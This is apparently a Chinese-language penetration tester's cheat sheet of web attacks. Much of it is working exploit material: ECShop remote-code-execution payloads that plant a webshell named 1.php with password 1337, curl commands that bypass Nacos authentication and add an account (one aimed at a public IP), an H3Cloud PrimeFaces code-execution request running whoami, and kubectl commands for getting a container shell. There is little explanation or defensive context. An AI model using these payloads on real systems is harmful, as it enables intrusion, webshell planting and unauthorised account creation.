# Web 安全

**同源方式执行（SOME）攻击**

**原理及危害**

> json可以理解为，用户可以控制输入的一种JS函数。并且这种函数可以跨域访问。这就很恐怖了。比如某些存在父子网页的并且还为做过滤，很有可能你一点击后就会自动执行某些链接，如自动关注，点赞等。

**攻击条件**
> 存在用户可控函数点，读取用户输入执行对应javascript代码（即寻找JSONP点，通常以get方法callback名传入）

**SOME复现**

通过一个大佬写的SOME靶场来练习复现:



### ECShop <= 2.x/3.6.x/3.0.x 版本远程代码执行高危漏洞利用

[ECShop <= 2.7.x 全系列版本远程代码执行高危漏洞利用](https://www.vulnspy.com/cn-ecshop-2.7.x-rce-exploit/)

[ECShop <= 2.x/3.6.x/3.0.x 版本远程代码执行高危漏洞利用](https://www.vulnspy.com/cn-ecshop-3.x.x-rce-exploit/)

**打开 ECSHOP 实验地址**

![](PHP绕过/绕过%20disable_functions/img/4.png)

**发送 Payload 执行 phpinfo();**

`将***.vsplate.me换成您的实验地址`

在终端中执行：

`curl http://***.vsplate.me/user.php -d "action=login&vulnspy=phpinfo();exit;" -H 'Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:"num";s:207:"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:2:"id";s:9:"'"'"' union/*";s:4:"name";s:3:"ads";}45ea207d7a2b68c49582d2d22adf953a'`

EXP与一个小脚本
2.x
phpinfo():
```
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:110:"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -";s:2:"id";s:4:"' /*";}554fcae493e564ee0dc75bdf2ebf94ca
```
webshell:
```
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}
```
　　会在网站根目录生成1.php，密码：1337

3.x
phpinfo():
```
Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a
```
webshell:
```
Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:289:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a
```
会在网站根目录生成1.php，密码：1337



![LARAVEL <= V8.4.2调试模式：远程执行代码](https://www.ambionics.io/blog/laravel-debug-rce)




[nacos绕过身份验证](https://github.com/alibaba/nacos/issues/4593)

漏洞复现

1. 访问用户列表界面

```bash
curl XGET 'http://47.93.46.78:9090/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server'


curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server'
```

此时认证被绕过，并且返回用户列表数据

```json
{
    "totalCount": 1,
    "pageNumber": 1,
    "pagesAvailable": 1,
    "pageItems": [
        {
            "username": "nacos",
            "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
        }
    ]
}
```

2. 添加新用户

```bash
curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test' -H 'User-Agent: Nacos-Server'
```

此时绕过身份验证，并添加了新用户
```json
{
    "code":200,
    "message":"create user ok!",
    "data":null
}
```


3. 再次查看用户列表

```bash
curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server'
```

此时绕过身份验证成功创建了一个用户。

```json
{
    "totalCount": 2,
    "pageNumber": 1,
    "pagesAvailable": 1,
    "pageItems": [
        {
            "username": "nacos",
            "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
        },
        {
            "username": "test",
            "password": "$2a$10$5Z1Kbm99AbBFN7y8Dd3.V.UGmeJX8nWKG47aPXXMuupC7kLe8lKIu"
        }
    ]
}
```

[nacos后台存在注入]

`命名空间 - 操作 - 详情 - 抓包` 1.4,1.3版本 存在该SQL注入漏洞。


H3CLOUD云管理平台

```
POST /cloud/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: 2.88.154.11
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive
Content-Length: 1563

pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami
```


**K8S获取容器shell**

```
kubtctl.exe -s ip:port get pods
kubectl.exe -s ip:port --namespace=default exec -it <CONTAINER ID> bash
```



**判断是否是站库分离**


1
```
（1）查询web服务器名

LENOVO-GH*****---select @@servername; 

（2）查询数据库服务器名

DESKTOP-1HV****---select host_name();

对比两个查询结果，即可判断。相同则同站同库，不同就是站库分离
```
2
```
找Web端IP地址select * from information_schema.PROCESSLIST;
```